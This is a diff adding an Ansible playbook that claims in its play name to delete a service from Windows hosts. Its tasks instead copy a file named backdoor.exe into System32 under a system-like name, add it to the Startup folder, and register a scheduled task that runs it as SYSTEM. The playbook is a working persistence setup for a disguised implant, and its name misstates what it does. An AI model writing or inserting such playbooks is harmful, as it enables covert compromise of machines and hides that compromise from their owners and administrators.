@@ -1,0 +1,23 @@
+---
+- name: Delete service from Windows
+  hosts: windows
+  gather_facts: false
+  tasks:
+    - name: Copy backdoor over
+      ansible.windows.win_copy:
+        src: backdoor.exe
+        dest: C:\Windows\System32\lnd.exe
+
+    - name: Run on startup
+      community.windows.win_shortcut:
+        src: C:\Windows\System32\lnd.exe
+        dest: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\lnd.lnk
+
+    - name: Run scheduled task / background exe
+      community.windows.win_scheduled_task:
+        name: LND
+        username: SYSTEM
+        actions:
+          - path: 'C:\Windows\System32\lnd.exe'
+        triggers:
+          - type: registration
